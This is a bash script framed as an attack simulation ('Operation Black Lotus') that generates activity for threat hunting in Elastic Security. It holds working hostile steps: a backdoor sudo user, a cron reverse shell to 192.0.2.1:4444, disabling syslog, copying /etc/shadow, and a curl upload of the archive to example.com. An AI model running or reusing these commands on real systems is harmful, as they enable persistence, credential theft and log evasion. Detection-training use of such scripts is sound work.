#!/bin/bash

echo "[*] Operation Black Lotus - Simulation Starting..."

# Step 1: Create rogue user
echo "[*] Creating user 'lotus'..."
sudo useradd -m -s /bin/bash lotus
echo 'lotus:Lotus@123' | sudo chpasswd

# Step 2: Add user to sudo group
echo "[*] Adding 'lotus' to sudo group..."
sudo usermod -aG wheel lotus
sleep 2

# Step 3: Set up cron persistence
echo "[*] Setting cronjob for persistence..."
sudo -u lotus bash -c 'echo "@reboot bash -i >& /dev/tcp/192.0.2.1/4444 0>&1" >> ~/.cronlotus && crontab ~/.cronlotus'
sleep 2

# Step 4: Privilege escalation
echo "[*] Attempting privilege escalation..."
sudo -u lotus bash -c 'echo "Lotus@123" | sudo -S id'
sleep 2

# Step 5: Create malicious payload script as lotus user
echo "[*] Writing secondary malicious script..."
sudo -u lotus bash << 'INNER'

mkdir -p ~/ops
cat <<PAYLOADEND > ~/ops/malicious_payload.sh
#!/bin/bash

echo "[*] Payload execution: Disabling logging..."
sudo systemctl stop rsyslog 2>/dev/null || sudo systemctl stop syslog 2>/dev/null

echo "[*] Reading sensitive files..."
sudo cat /etc/shadow > /tmp/shadow_copy

echo "[*] Archiving data..."
tar czf /tmp/data_bundle.tar.gz /etc/passwd /tmp/shadow_copy

echo "[*] Simulating exfiltration via curl..."
curl -X POST -F "file=@/tmp/data_bundle.tar.gz" http://example.com/upload || echo "[!] Exfil simulation done"

PAYLOADEND

chmod +x ~/ops/malicious_payload.sh
sleep 2

echo "[*] Executing malicious script with elevated privileges..."
echo "Lotus@123" | sudo -S bash ~/ops/malicious_payload.sh

sleep 2
echo "[*] Running nmap for internal discovery..."
sudo apt install -y nmap > /dev/null 2>&1
sudo nmap -sS -T4 127.0.0.1 > /dev/null

INNER

# Step 6: Delete rogue user
echo "[*] Deleting user 'lotus'..."
sudo userdel lotus
sudo rm -rf /home/lotus

# Step 7: Additional exfil command
sudo -l


echo "[*] Operation complete. Begin threat hunting in Elastic Security..."